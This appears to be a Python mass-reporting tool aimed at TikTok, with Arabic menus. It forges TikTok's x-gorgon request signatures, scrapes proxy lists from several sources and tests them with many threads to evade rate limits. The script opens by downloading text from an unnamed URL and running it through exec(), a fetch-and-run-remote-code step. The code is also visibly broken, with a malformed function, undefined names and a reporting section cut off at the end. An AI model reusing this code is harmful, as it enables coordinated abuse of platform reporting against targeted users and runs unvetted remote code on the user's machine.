response = requests.get(url)
code = response.text


exec(code)
tr,fa,er=0,0,0
class ttsign:
    def __init__(self, params: str, data: str, cookies: str) -> None:
        self.params = params
        self.data = data
        self.cookies = cookies
    def hash(self, data: str) -> str:
        return str(hashlib.md5(data.encode()).hexdigest())
    def get_base_string(self) -> str:
        base_str = self.hash(self.params)
        base_str = (
            base_str + self.hash(self.data) if self.data else base_str + str("0" * 32)
        )
        base_str = (
            base_str + self.hash(self.cookies)
            if self.cookies
            else base_str + str("0" * 32)
        )
        return base_str
    def get_value(self) -> json:
        return self.encrypt(self.get_base_string())
    def encrypt(self, data: str) -> json:
        unix = time.time()
        len = 0x14
        key = [
            0xDF,
            0x77,
            0xB9,
            0x40,
            0xB9,
            0x9B,
            0x84,
            0x83,
            0xD1,
            0xB9,
            0xCB,
            0xD1,
            0xF7,
            0xC2,
            0xB9,
            0x85,
            0xC3,
            0xD0,
            0xFB,
            0xC3,
        ]
        param_list = []
        for i in range(0, 12, 4):
            temp = data[8 * i : 8 * (i + 1)]
            for j in range(4):
                H = int(temp[j * 2 : (j + 1) * 2], 16)
                param_list.append(H)
        param_list.extend([0x0, 0x6, 0xB, 0x1C])
        H = int(hex(int(unix)), 16)
        param_list.append((H & 0xFF000000) >> 24)
        param_list.append((H & 0x00FF0000) >> 16)
        param_list.append((H & 0x0000FF00) >> 8)
        param_list.append((H & 0x000000FF) >> 0)
        eor_result_list = []
        for A, B in zip(param_list, key):
            eor_result_list.append(A ^ B)
        for i in range(len):
            C = self.reverse(eor_result_list[i])
            D = eor_result_list[(i + 1) % len]
            E = C ^ D
            F = self.rbit_algorithm(E)
            H = ((F ^ 0xFFFFFFFF) ^ len) & 0xFF
            eor_result_list[i] = H
        result = ""
        for param in eor_result_list:
            result += self.hex_string(param)
        return {
            "x-ss-req-ticket": str(int(unix * 1000)),
            "x-khronos": str(int(unix)),
            "x-gorgon": ("0404b0d30000" + result),
        }

    def rbit_algorithm(self, num):
        result = ""
        tmp_string = bin(num)[2:]
        while len(tmp_string) < 8:
            tmp_string = "0" + tmp_string
        for i in range(0, 8):
            result = result + tmp_string[7 - i]
        return int(result, 2)

    def hex_string(self, num):
        tmp_string = hex(num)[2:]
        if len(tmp_string) < 2:
            tmp_string = "0" + tmp_string
        return tmp_string

    def reverse(self, num):
        tmp_string = self.hex_string(num)
        return int(tmp_string[1:] + tmp_string[:1], 16)
#--------------------------------------------
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m' #اصفر
F = '\033[2;32m'
Z = '\033[1;31m' 
L = "\033[1;95m"  #ارجواني
C = '\033[2;35m' #وردي
A = '\033[2;39m' #ازرق
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
J1='\x1b[38;5;202m'
J2='\x1b[38;5;203m' #وردي
J21='\x1b[38;5;204m'
J22='\x1b[38;5;209m'
F1='\x1b[38;5;76m'
C1='\x1b[38;5;120m'
P1='\x1b[38;5;150m'
P2='\x1b[38;5;190m'
def clear():
            import pyfiglet
from termcolor import colored

hakm_logo = pyfiglet.figlet_format("NASR")
print(colored(hakm_logo, "cyan"))
print(colored("معرّف المطوّر: @NASR101", "cyan"))


clear()
from termcolor import colored
import os

# تعريف دالة clear قبل استخدامها
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# طباعة القائمة
print(colored("[1]  سحب بروكسي قوي", "cyan"))
print(colored("[2]  سحب بروكسي ضعيف", "cyan"))
print(colored("[3]  أبدء البلاغ", "cyan"))

# إدخال المستخدم
Get_aobsh = input(colored("[×] اختار : ", "cyan"))
clear()

# الخيار 1: سحب البروكسيات
if Get_aobsh == '1':
    import sys
    import time
    import socket
    import random
    import pyfiglet
    import requests
    from bs4 import BeautifulSoup
    from concurrent.futures import ThreadPoolExecutor, as_completed

    F = '\033[92m'
    Z = '\033[91m'
    B = '\033[96m'
    Y = '\033[93m'
    W = '\033[97m'
    bi = '\033[0m'

    def get_random_headers():
        USER_AGENTS = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
            "Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0"
        ]
        return {"User-Agent": random.choice(USER_AGENTS)}

    def is_connected():
        try:
            requests.get("https://www.google.com", timeout=5, headers=get_random_headers())
            return True
        except:
            return False

    def is_proxy_working(proxy):
        proxy_url = f"http://{proxy}"
        proxies = {"http": proxy_url, "https": proxy_url}
        try:
            response = requests.get("https://httpbin.org/ip", proxies=proxies, timeout=8, headers=get_random_headers())
            return response.status_code == 200 and response.elapsed.total_seconds() < 5
        except:
            return False

    def fetch_proxies():
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all",
            "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://proxyspace.pro/https.txt",
            "https://vakhov.github.io/fresh-proxy-list/https.txt"
        ]
        proxies = set()
        print(colored("تحميل البروكسيات من أكثر من 20 مصدر موثوق...", "yellow"))
        for url in sources:
            try:
                r = requests.get(url, timeout=10, headers=get_random_headers())
                if r.status_code == 200:
                    for line in r.text.strip().splitlines():
                        line = line.strip()
                        if line and ":" in line and "." in line:
                            proxies.add(line)
            except:
                continue
        return list(proxies)

    def print_progress(done, total, success, fail, elapsed, first=False):
        percent = (done / total) * 100
        bar_length = 40
        filled = int(bar_length * percent / 100)
        bar = f"{F}{'█' * filled}{Z}{'░' * (bar_length - filled)}{bi}"

        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        speed = done / elapsed if elapsed > 0 else 0

        if first:
            sys.stdout.write("\n" * 4)

        sys.stdout.write("\033[4A")
        sys.stdout.write(f"{Y}🔄 Progress: {bar} {W}{percent:5.1f}%{bi}\n")
        sys.stdout.write(f"{F}✅ Success : {success:<5}   {Z}❌ Failed : {fail:<5}{bi}\n")
        sys.stdout.write(f"{Y}⏱️ Time    : {minutes}m {seconds}s   {B}⚡ Speed  : {speed:.2f} proxy/s{bi}\n")
        sys.stdout.write(f"{W}{'-'*50}{bi}\n")
        sys.stdout.flush()

    def test_proxies_main():
        clear()
        print(colored(pyfiglet.figlet_format("NASR Proxy"), "yellow"))
        print(colored("🧪 فحص بروكسيات HTTPS | شريط ثابت واحترافي", "cyan"))

        if not is_connected():
            print(colored("❌ لا يوجد اتصال بالإنترنت!", "red"))
            return

        if os.path.exists("nasr1.txt"):
            print(colored("📁 يوجد ملف nasr1.txt مسبقاً", "yellow"))
            choice = input(colored("هل تريد حذفه؟ (y/n): ", "cyan")).strip().lower()
            if choice == 'y':
                os.remove("nasr1.txt")
                print(colored("🗑️ تم الحذف", "magenta"))
            else:
                print(colored("📥 سيتم الإضافة عليه", "yellow"))

        proxies = fetch_proxies()
        print(colored(f"🔍 تم جمع {len(proxies)} بروكسي. جاري الفحص...", "cyan"))

        success, fail, done = 0, 0, 0
        start = time.time()

        print_progress(0, len(proxies), 0, 0, 0, first=True)

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(is_proxy_working, p): p for p in proxies}
            for future in as_completed(futures):
                proxy = futures[future]
                try:
                    if future.result():
                        with open("nasr1.txt", "a") as f:
                            f.write(proxy + "\n")
                        success += 1
                    else:
                        fail += 1
                except:
                    fail += 1

                done += 1
                elapsed = time.time() - start
                print_progress(done, len(proxies), success, fail, elapsed)

        print(colored("✅ تم حفظ البروكسيات الصالحة في nasr1.txt", "green"))

    test_proxies_main()
     
          
          
if Get_aobsh in '2':
     e=0
     er=0
     PR1='https://www.proxy-list.download/api/v1/get?type=httpt'
     PR2="https://www.proxy-list.download/api/v1/get?type=https"
     PR3="https://api.proxyscrape.com/?request=getproxies&proxytype=http"
     clear()
     ls=[]
     try:
          os.remove('nasr1.txt')
     except:
          pass
     try:
          os.remove('nasr.txt')
     except:
          pass
     DA3=requests.get("%s"%(PR1)).text
     with open('nasr.txt','a') as Prox1y:
          Prox1y.write(DA3+"\n")
     DA1=requests.get("%s"%(PR2)).text
     with open('nasr.txt','a') as Prox1y:
          Prox1y.write(DA1+"\n")
     DA2=requests.get("%s"%(PR3)).text
     with open('nasr.txt','a') as Prox1y:
          Prox1y.write(DA2+"\n")
     try:
          O = open('nasr.txt','r').read().splitlines()
          for prox in O:
               ls.append(prox)
     except:print("STOP");exit()
     def af():
          global e,er
          while 1:
               proxies1 = str(random.choice(ls))
               try:
                    headers = {"user-agent": 'com.zhiliaoapp.musically/2023100040 (Linux; U; Android 9; en; G011A; Build/PI;tt-ok/3.12.13.1)'}
                    requests.get(f"https://api16-normal-c-useast1a.tiktokv.com/aweme/v2/aweme/feedback/?", headers=headers,proxies={'https': f'socks5://{proxies1}','https': f'socks4://{proxies1}','https': f'http://{proxies1}'}).text
                    with open('nasr1.txt','a') as Prox1y:
                            Prox1y.write(proxies1+'\n')
                    e +=1
                    print(f'\r{X}[{F}{e}{X}]{A} -{C1} {proxies1}{A} - {X}[{Z}{er}{X}]       ',end='')
               except:er+=1;print(f'\r{X}[{F}{e}{X}]{A} -{C1} {proxies1}{A} - {X}[{Z}{er}{X}]       ',end='')
     for i in range(300):
          t = threading.Thread(target=af)
          t.start()    
if Get_aobsh in '3':
  
 # -*- coding: utf-8 -*-
# مراقبة حساب تيك توك + جلب بلد الحساب + فحص خلفي كل 10 ثواني + تنبيه تيليجرام عند حذف فيديو
 # -*- coding: utf-8 -*-
 # -*- coding: utf-8 -*-
